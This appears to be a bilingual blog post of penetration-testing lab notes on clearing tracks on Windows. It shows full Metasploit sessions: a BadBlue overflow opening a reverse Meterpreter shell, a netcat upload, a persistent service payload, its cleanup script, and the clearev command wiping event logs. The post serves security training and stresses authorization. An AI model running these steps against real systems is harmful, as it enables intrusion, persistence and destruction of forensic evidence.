---
layout: post
title: "Clearing Your Tracks On Windows"
date: "2023-07-21"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Clearing Your Tracks On Windows（清除Windows上的痕迹）
The exploitation and post-exploitation phases of a penetration test involves actively engaging with target systems and the data that is stored on these systems.

As a result, you may be required to clear/undo any changes you have made to the target systems you have compromised based on the guidelines specified in the rules of engagement.

If you have transferred any files to the target systems you have compromised, keep track of where they have been saved so that you can remove them when done.

A good practice is to store all your scripts, exploits and binaries in the C:/Temp directory on Windows and the /tmp directory on Linux.

渗透测试的利用和后期利用阶段涉及积极与目标系统以及存储在这些系统上的数据进行互动。

因此，根据约定规则，您可能需要清除/撤销对已被入侵的目标系统所做的任何更改。

如果您将任何文件传输到已被入侵的目标系统，请记录它们保存的位置，以便在完成后将其移除。

一个良好的实践是将所有脚本、攻击工具和二进制文件存储在Windows系统的C:/Temp目录以及Linux系统的/tmp目录中。

It is also important to consider the exploitation framework you are using, an example of this is MSF, which is notorious for generating and storing artifacts on the target system when using exploit or post modules.

Some well designed MSF modules provide you with instructions and resource scripts that provide you with information regarding where the artifacts are stored and how they can be removed.

In the context of Windows, a typical post-exploitation technique pertinent to clearing your tracks is to delete the Windows Event Log. This is something that should be avoided during a penetration test as the Windows Event Log stores a lot of data that is important to the client you are performing the penetration test for.

同样重要的是考虑您正在使用的利用框架，其中一个例子是MSF（Metasploit Framework），它以在使用利用或后期模块时在目标系统上生成和存储痕迹而出名。

一些设计良好的MSF模块会提供说明和资源脚本，以提供有关痕迹存储位置和如何移除它们的信息。

在Windows环境下，与清除痕迹相关的典型后期利用技术是删除Windows事件日志。在渗透测试中应避免这样做，因为Windows事件日志存储了对您进行渗透测试的客户非常重要的许多数据。

# Demo: Clearing Your Tracks On Windows（演示：清除Windows上的痕迹）
If you've gained access to a Windows system and you want to transfer some files onto it, store them within the Temp directory. There's two reasons why you should be doing this. Firstly, you'll know where everything that you've transferred is saved, so you know that whatever you transferred onto the target system is stored within the Temp directory, so there's a singular centralized location where you're storing everything. Secondly, in the context of defensive vision, this will storing your exploits and scripts within a Temp directory is a good practice, primarily because it is not a frequently accessed folder and users will not really be able to tell whether the system has been compromised, because all the files are stored within a directory that they don't frequently access and the same goes for Linux.

Target IP Address : 10.0.23.172

```
nmap -sV -p 80 10.0.23.172
```

```
msfconsole -q
search BadBlue
use 1
show options
set RHOSTS 10.0.23.172
show advanced
```

The objective here is to try and identify whether we can find an option that sort of is pertinent to whether or not this module generates specific artifacts and whether it automatically deletes them.

```
show info
exploit
```

```
meterpreter > sysinfo
```

Let's check out our user privileges. Get user id.

```
meterpreter > getuid
```

We currently have access to the target system as the administrator user.

```
meterpreter > pgrep explorer
4032
```

```
meterpreter > migrate 4032
```

```
meterpreter > sysinfo
```

Let's take a look at the first recommendation that is pertinent to where you transfer or store files on the target system. It's always recommended to store them within the Temp directory. 

```
meterpreter > cd C:\\
meterpreter > pwd
meterpreter > ls
meterpreter > mkdir Temp
meterpreter > cd Temp
meterpreter > pwd
```

The Temp directory is typically stored in the root of the C drive on Windows.

```
meterpreter > upload /usr/share/windows-binaries/nc.exe
meterpreter > ls
meterpreter > rm nc.exe
meterpreter > ls
meterpreter > background
```

The next recommendation ties into the Metasploit Framework exploitation and post exploitation modules.

[Windows Persistent Service Installer](https://www.rapid7.com/db/modules/exploit/windows/local/persistence_service/)

Windows Persistent Service Installer

Windows 持久服务安装程序

This Module will generate and upload an executable to a remote host, next will make it a persistent service. It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.

此模块将生成可执行文件并将其上传到远程主机，接下来将使其成为持久服务。它将创建一个新服务，该服务将在服务运行时启动有效负载。需要管理员或系统权限。

```
search persistence platform:windows
use exploit/windows/local/persistence_service
show options
set LPORT 4433
set SESSION 1
show info
exploit
```

Persistence is something that is very important, however it leaves a lot of artifacts on the target system. And as part of the rules of engagement, when you're done with the pentest, you need to get rid of all of this. You cannot have this running on the system that you've compromised because if a real attacker finds this running, then they could potentially exploit it and then you will be responsible for that company or for your client being exploited. So never leave anything that could be useful for a real attacker or adversary.

```
meterpreter > cd C:\\
meterpreter > cd Users
meterpreter > cd Administrator
meterpreter > cd AppData
meterpreter > cd Local
meterpreter > cd Temp
meterpreter > ls
meterpreter > exit
```

It's generated a Cleanup Meterpreter Resource Script file. A Resource Script is a script that is used of within the Metasploit Framework to automate a specific task that you want to perform with msfconsole. 

Open up a new tab.

```
cat .rc
```

When we run it on the target system, it will stop that service that was generated the persistent service, it'll then delete the service, it'll then utilize taskkill.exe to kill that particular process and it has the relative string or the name of the process or service for that matter. And then it will also delete that particular executable for you that was transfered to the target system.

The next question is how do I use this particular resource script.

```
sessions
sessions 1
```

In order to run a resource script.

```
meterpreter > resource .rc
```

We can confirm this and see whether this is the case.

```
meterpreter > cd C:\\
meterpreter > cd Users
meterpreter > cd Administrator
meterpreter > cd AppData
meterpreter > cd Local
meterpreter > cd Temp
meterpreter > ls
```

All the artifacts that were generated and the services that were created have all been deleted.

The final recommendation was pertinent to clearing the Windows event log. Meterpreter has an inbuilt command that will clear the entire Windows event log on the target.

```
meterpreter > clearev
```

This is going to clear the entire Windows event log on the target system.

# Clearing Your Tracks On Windows（清除 Windows 上的轨迹）
## Overview（概述）
Goal 目标 

This lab covers the process of clearing your tracks on a Windows system.

本实验介绍了在 Windows 系统上清除跟踪的过程。

## Tasks（任务）
Pre-requisites 先决条件 

Basic familiarity with Windows. 基本熟悉Windows。 
Basic Familiarity with Metasploit. 对Metasploit的基本熟悉。

Requirements 要求 

This task does not have any requirements. 此任务没有任何要求。

## 复现视频内容
Target IP Address : 10.0.19.113

```
root@attackdefense:~# nmap -sV -p 80 10.0.19.113
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-21 15:12 IST
Nmap scan report for 10.0.19.113
Host is up (0.0030s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    BadBlue httpd 2.7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.74 seconds
```

```
root@attackdefense:~# msfconsole -q
msf6 > search BadBlue 2.7

Matching Modules
================

   #  Name                                   Disclosure Date  Rank   Check  Description
   -  ----                                   ---------------  ----   -----  -----------
   0  exploit/windows/http/badblue_passthru  2007-12-10       great  No     BadBlue 2.72b PassThru Buffer Overflow


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/badblue_passthru

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/badblue_passthru) > show options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf6 exploit(windows/http/badblue_passthru) > set RHOSTS 10.0.19.113
RHOSTS => 10.0.19.113
msf6 exploit(windows/http/badblue_passthru) > show advanced
msf6 exploit(windows/http/badblue_passthru) > show info
```

```
msf6 exploit(windows/http/badblue_passthru) > exploit

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (175174 bytes) to 10.0.19.113
[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.0.19.113:49749) at 2023-07-21 15:16:49 +0530

meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > pgrep explorer
4092
meterpreter > migrate 4092
[*] Migrating from 4856 to 4092...
[*] Migration completed successfully.
meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
```

```
meterpreter > cd C:\\
meterpreter > pwd
C:\
meterpreter > ls
Listing: C:\
============

Mode              Size       Type  Last modified              Name
----              ----       ----  -------------              ----
40777/rwxrwxrwx   0          dir   2018-09-15 12:49:00 +0530  $Recycle.Bin
100666/rw-rw-rw-  1          fil   2018-11-14 12:26:16 +0530  BOOTNXT
40777/rwxrwxrwx   8192       dir   2018-11-14 12:26:15 +0530  Boot
40777/rwxrwxrwx   0          dir   2018-11-14 21:40:15 +0530  Documents and Settings
40777/rwxrwxrwx   0          dir   2018-11-14 12:26:17 +0530  EFI
40777/rwxrwxrwx   0          dir   2018-09-15 12:49:00 +0530  PerfLogs
40555/r-xr-xr-x   4096       dir   2018-09-15 12:49:00 +0530  Program Files
40777/rwxrwxrwx   4096       dir   2018-09-15 12:49:00 +0530  Program Files (x86)
40777/rwxrwxrwx   4096       dir   2018-09-15 12:49:00 +0530  ProgramData
40777/rwxrwxrwx   0          dir   2018-11-15 05:37:05 +0530  Recovery
40777/rwxrwxrwx   4096       dir   2020-10-27 10:42:39 +0530  System Volume Information
40555/r-xr-xr-x   4096       dir   2018-09-15 11:39:26 +0530  Users
40777/rwxrwxrwx   16384      dir   2018-09-15 11:39:26 +0530  Windows
100444/r--r--r--  408692     fil   2018-11-14 12:26:16 +0530  bootmgr
0000/---------    157763616  fif   1973-01-16 22:58:16 +0530  pagefile.sys

meterpreter > mkdir Temp
Creating directory: Temp
meterpreter > cd Temp
meterpreter > pwd
C:\Temp
```

```
meterpreter > upload /usr/share/windows-binaries/nc.exe
[*] uploading  : /usr/share/windows-binaries/nc.exe -> nc.exe
[*] Uploaded 58.00 KiB of 58.00 KiB (100.0%): /usr/share/windows-binaries/nc.exe -> nc.exe
[*] uploaded   : /usr/share/windows-binaries/nc.exe -> nc.exe
meterpreter > pwd
C:\Temp
meterpreter > ls
Listing: C:\Temp
================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100777/rwxrwxrwx  59392  fil   2023-07-21 15:22:48 +0530  nc.exe

meterpreter > rm nc.exe
meterpreter > ls
No entries exist in C:\Temp
meterpreter > background
[*] Backgrounding session 1...
```

```
msf6 exploit(windows/http/badblue_passthru) > search persistence platform:windows

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank       Check  Description
   -   ----                                                  ---------------  ----       -----  -----------
   0   exploit/windows/local/persistence                     2011-10-19       excellent  No     Windows Persistent Registry Startup Payload Installer
   1   exploit/windows/local/persistence_image_exec_options  2008-06-28       excellent  No     Windows Silent Process Exit Persistence
   2   exploit/windows/local/persistence_service             2018-10-20       excellent  No     Windows Persistent Service Installer
   3   exploit/windows/local/ps_wmi_exec                     2012-08-19       excellent  No     Authenticated WMI Exec via Powershell
   4   exploit/windows/local/registry_persistence            2015-07-01       excellent  Yes    Windows Registry Only Persistence
   5   exploit/windows/local/s4u_persistence                 2013-01-02       excellent  No     Windows Manage User Level Persistent Payload Installer
   6   exploit/windows/local/vss_persistence                 2011-10-21       excellent  No     Persistent Payload in Windows Volume Shadow Copy
   7   exploit/windows/local/wmi_persistence                 2017-06-06       normal     No     WMI Event Subscription Persistence
   8   post/windows/gather/enum_ad_managedby_groups                           normal     No     Windows Gather Active Directory Managed Groups
   9   post/windows/manage/persistence_exe                                    normal     No     Windows Manage Persistent EXE Payload Installer
   10  post/windows/manage/sshkey_persistence                                 good       No     SSH Key Persistence


Interact with a module by name or index. For example info 10, use 10 or use post/windows/manage/sshkey_persistence

msf6 exploit(windows/http/badblue_passthru) > use 2
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/persistence_service) > show options

Module options (exploit/windows/local/persistence_service):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   REMOTE_EXE_NAME                       no        The remote victim name. Random string as default.
   REMOTE_EXE_PATH                       no        The remote victim exe path to run. Use temp directory as default.
   RETRY_TIME           5                no        The retry time that shell connect failed. 5 seconds as default.
   SERVICE_DESCRIPTION                   no        The description of service. Random string as default.
   SERVICE_NAME                          no        The name of service. Random string as default.
   SESSION                               yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(windows/local/persistence_service) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                  Connection
  --  ----  ----                     -----------                                  ----------
  1         meterpreter x64/windows  ATTACKDEFENSE\Administrator @ ATTACKDEFENSE  10.10.16.2:4444 -> 10.0.19.113:49749 (10.0.19.113)

msf6 exploit(windows/local/persistence_service) > set LPORT 4433
LPORT => 4433
msf6 exploit(windows/local/persistence_service) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/persistence_service) > exploit

[*] Started reverse TCP handler on 10.10.16.2:4433 
[*] Running module against ATTACKDEFENSE
[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\yXSEGLTG.exe
[*] Creating service gEvSzIR
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ATTACKDEFENSE_20230721.3007/ATTACKDEFENSE_20230721.3007.rc
[*] Sending stage (175174 bytes) to 10.0.19.113
[*] Meterpreter session 2 opened (10.10.16.2:4433 -> 10.0.19.113:49807) at 2023-07-21 15:30:07 +0530

meterpreter > 
```

```
meterpreter > pwd
C:\Windows\system32
meterpreter > cd C:\\
meterpreter > cd Users 
meterpreter > ls
Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   2020-10-27 10:45:26 +0530  Administrator
40777/rwxrwxrwx   0     dir   2018-09-15 12:58:48 +0530  All Users
40555/r-xr-xr-x   8192  dir   2018-09-15 11:39:26 +0530  Default
40777/rwxrwxrwx   0     dir   2018-09-15 12:58:48 +0530  Default User
40555/r-xr-xr-x   4096  dir   2018-09-15 12:49:00 +0530  Public
100666/rw-rw-rw-  174   fil   2018-09-15 12:46:48 +0530  desktop.ini
40777/rwxrwxrwx   8192  dir   2020-10-27 15:27:42 +0530  student

meterpreter > cd Administrator 
meterpreter > cd App
cd AppData            cd Application\ Data  
meterpreter > cd AppData 
meterpreter > cd Local
meterpreter > cd Temp
meterpreter > ls
Listing: C:\Users\Administrator\AppData\Local\Temp
==================================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
40777/rwxrwxrwx   0      dir   2023-07-21 15:12:12 +0530  Low
100777/rwxrwxrwx  5632   fil   2023-07-21 15:30:07 +0530  yXSEGLTG.exe
100666/rw-rw-rw-  16384  fil   2023-07-21 15:12:13 +0530  ~DFCC7F5C8B0BE8160E.TMP
100666/rw-rw-rw-  16384  fil   2023-07-21 15:12:14 +0530  ~DFD0CF2CE10438D90C.TMP
```

```
root@attackdefense:~# cat /root/.msf4/logs/persistence/ATTACKDEFENSE_20230721.3007/ATTACKDEFENSE_20230721.3007.rc
execute -H -f sc.exe -a "stop gEvSzIR"
execute -H -f sc.exe -a "delete gEvSzIR"
execute -H -i -f taskkill.exe -a "/f /im yXSEGLTG.exe"
rm "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\yXSEGLTG.exe"
```

该MSF资源脚本执行以下操作：

1. `execute -H -f sc.exe -a "stop gEvSzIR"`：使用sc.exe（服务控制管理器）停止名为"gEvSzIR"的服务。这里的"-H"选项表示以隐藏模式执行该命令，使其在目标系统上不可见。

2. `execute -H -f sc.exe -a "delete gEvSzIR"`：使用sc.exe（服务控制管理器）删除名为"gEvSzIR"的服务。同样，"-H"选项隐藏执行。

3. `execute -H -i -f taskkill.exe -a "/f /im yXSEGLTG.exe"`：使用taskkill.exe终止名为"yXSEGLTG.exe"的进程，并使用"/f"参数强制终止。此处的"-H"选项仍然表示以隐藏模式执行，但"-i"选项表示使用交互式模式执行，以便在目标系统上可以查看命令执行的结果。

4. `rm "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\yXSEGLTG.exe"`：删除位于目标系统上"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\"目录中的"yXSEGLTG.exe"文件。

总的来说，该脚本用于清除名为"gEvSzIR"的服务以及终止名为"yXSEGLTG.exe"的进程，并删除与该进程相关的文件。这些操作可能是为了清除渗透测试期间在目标系统上留下的痕迹。请注意，这样的操作应仅在获得了合法授权且遵守渗透测试的规则与道德准则的情况下进行。否则，这可能构成非法入侵和系统破坏行为。

This MSF (Metasploit Framework) resource script appears to contain a series of commands to perform specific actions on a compromised Windows system. Let's break down each line of the script:

1. `execute -H -f sc.exe -a "stop gEvSzIR"`:
   - `execute`: This command instructs Metasploit to execute an external command on the compromised system.
   - `-H`: The `-H` option indicates that the command should be executed in a hidden mode, making it less visible to the user on the target system.
   - `-f sc.exe`: The `-f` option specifies the path to the `sc.exe` executable, which is the Service Control Manager utility in Windows.
   - `-a "stop gEvSzIR"`: The `-a` option provides arguments to the `sc.exe` command. In this case, it stops the service named "gEvSzIR."

2. `execute -H -f sc.exe -a "delete gEvSzIR"`:
   - This line is similar to the previous one but instead of stopping the service, it uses `sc.exe` to delete the service named "gEvSzIR."

3. `execute -H -i -f taskkill.exe -a "/f /im yXSEGLTG.exe"`:
   - This command is similar to the previous ones but with some additional options.
   - `-i`: The `-i` option indicates that the command should be executed in an interactive mode, meaning the output of the `taskkill.exe` command will be displayed on the target system.
   - `-f taskkill.exe`: The `-f` option specifies the path to the `taskkill.exe` executable, which is used to terminate processes in Windows.
   - `-a "/f /im yXSEGLTG.exe"`: The `-a` option provides arguments to the `taskkill.exe` command. In this case, it forcefully terminates the process named "yXSEGLTG.exe."

4. `rm "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\yXSEGLTG.exe"`:
   - The `rm` command is used to remove (delete) a file from the file system.
   - `"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\yXSEGLTG.exe"`: This is the path to the file "yXSEGLTG.exe" located in the Temp directory of the user "ADMINI~1" on the Windows system. The double backslashes are used to escape the backslashes in the file path.

In summary, this resource script is designed to stop and delete a service named "gEvSzIR," forcefully terminate a process named "yXSEGLTG.exe," and finally, remove the file "yXSEGLTG.exe" from the Temp directory on the compromised Windows system. These actions are likely intended to cover tracks and remove traces of the attacker's activities on the compromised system. Again, it's crucial to emphasize that such actions should only be performed with proper authorization during authorized penetration testing activities. Unauthorized or malicious use of these commands may lead to legal consequences.

```
msf6 exploit(windows/local/persistence_service) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                  Connection
  --  ----  ----                     -----------                                  ----------
  1         meterpreter x64/windows  ATTACKDEFENSE\Administrator @ ATTACKDEFENSE  10.10.16.2:4444 -> 10.0.19.113:49749 (10.0.19.113)

msf6 exploit(windows/local/persistence_service) > sessions 1
[*] Starting interaction with 1...

meterpreter > resource /root/.msf4/logs/persistence/ATTACKDEFENSE_20230721.3007/ATTACKDEFENSE_20230721.3007.rc
[*] Processing /root/.msf4/logs/persistence/ATTACKDEFENSE_20230721.3007/ATTACKDEFENSE_20230721.3007.rc for ERB directives.
resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20230721.3007/ATTACKDEFENSE_20230721.3007.rc)> execute -H -f sc.exe -a "stop gEvSzIR"
Process 4524 created.
resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20230721.3007/ATTACKDEFENSE_20230721.3007.rc)> execute -H -f sc.exe -a "delete gEvSzIR"
Process 920 created.
resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20230721.3007/ATTACKDEFENSE_20230721.3007.rc)> execute -H -i -f taskkill.exe -a "/f /im yXSEGLTG.exe"
Process 2756 created.
Channel 3 created.
ERROR: The process "yXSEGLTG.exe" not found.
resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20230721.3007/ATTACKDEFENSE_20230721.3007.rc)> rm "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\yXSEGLTG.exe"
```

```
meterpreter > cd C:\\
meterpreter > cd Users 
meterpreter > cd Administrator 
meterpreter > cd AppData 
meterpreter > cd Local
meterpreter > cd Temp
meterpreter > ls
Listing: C:\Users\Administrator\AppData\Local\Temp
==================================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
40777/rwxrwxrwx   0      dir   2023-07-21 15:12:12 +0530  Low
40777/rwxrwxrwx   0      dir   2023-07-21 15:36:58 +0530  WinSAT
100666/rw-rw-rw-  16384  fil   2023-07-21 15:12:13 +0530  ~DFCC7F5C8B0BE8160E.TMP
100666/rw-rw-rw-  16384  fil   2023-07-21 15:12:14 +0530  ~DFD0CF2CE10438D90C.TMP
```

在Meterpreter交互式shell中，`clearev`命令用于清除Windows事件日志。Meterpreter是Metasploit框架中一种功能强大的后渗透工具，可用于与目标系统进行交互并执行各种操作。

Windows事件日志是Windows操作系统用于记录各种事件和活动的重要日志文件。在渗透测试或恶意攻击期间，攻击者可能会在目标系统上留下一些日志，记录其活动和存在。这些日志可能包含有关攻击行为的线索，因此攻击者通常希望清除这些日志以覆盖其踪迹。

`clearev`命令的作用就是帮助攻击者清除或清空Windows事件日志，使其更难被检测或追踪。但需要明确的是，这样的行为是非法的，违反了计算机犯罪法律，并可能导致严重的法律后果。

在合法的渗透测试和红队活动中，清除事件日志是受控的，并且只能在获得明确授权的情况下进行，以遵守规则和法律要求。在任何情况下，未经授权地清除事件日志是不被允许的，并且会对您的行为产生负面影响。

In the context of Metasploit's Meterpreter, the command "clearev" is used to clear Windows event logs. Meterpreter is a powerful post-exploitation tool within the Metasploit Framework, designed to interact with the target system and perform various actions.

Windows event logs are essential log files used by the Windows operating system to record various events and activities. During penetration testing or malicious attacks, an attacker may leave behind logs on the target system, documenting their actions and presence. These logs may contain clues about the attack behavior, so attackers often seek to clear these logs to cover their tracks.

The purpose of the "clearev" command is to help attackers clear or empty the Windows event logs, making it more challenging to be detected or traced. However, it's important to clarify that such actions are illegal, violating computer crime laws, and may lead to severe legal consequences.

In legitimate penetration testing and red teaming activities, clearing event logs is controlled and can only be done with explicit authorization to comply with rules and legal requirements. Under no circumstances is clearing event logs without authorization allowed, and it can have negative consequences for your actions.

```
meterpreter > clearev 
[*] Wiping 167 records from Application...
[*] Wiping 784 records from System...
[*] Wiping 2634 records from Security...
```